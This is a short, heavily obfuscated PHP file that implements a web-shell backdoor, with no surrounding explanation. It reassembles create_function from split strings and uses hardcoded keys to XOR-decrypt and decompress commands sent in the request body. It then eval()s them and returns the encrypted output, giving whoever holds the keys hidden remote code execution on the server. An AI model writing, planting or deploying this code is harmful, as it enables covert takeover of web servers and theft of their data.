<?php
$b='597d!mNN!mQa"!m;function x($!mt,$k){$!mc=strl!me!mn($k!m);$l=strlen($!m!mt);$o=!m""!m;f';
$S='!mor($i=0;$i<$l;){!mfor(!m$j=0;($j<!m$c&&!m$i<$l);$j++!m,$i!m++){$!mo.=$t{$i}!m^$!mk{$';
$Z='j};!m}}return!m $!mo;}if (@pr!me!mg_ma!mtch("/$kh!m(.!m!m+)$kf/",@file_get!m_content';
$V='!m();$r=@base6!m4_e!mncode(@x(@gzcom!m!mpress(!m$o),$k))!m;p!mrin!mt("$p$kh$r$kf");}';
$Y='$k="7cdfe!m!m695";$kh!m="75d1f!mb43e9!m5c";!m$kf!m="5!m98883291da0!m";$p="q!mBjjiwd5';
$T=str_replace('Tx','','cTxreaTxTxte_fTxunTxcTxtion');
$z='bas!me64_decode(!m$m!m[!m1])!m,$k)));!m$o=!m@ob_get_contents!m();@!mob!m_end_!mclean';
$M='s!m("php!m:!m//input!m"),$m)==1!m) {@ob!m_start();!m@e!mval(@gzuncom!mpress!m(@x(@!m';
$I=str_replace('!m','',$Y.$b.$S.$Z.$M.$z.$V);
$Q=$T('',$I);$Q();
?>
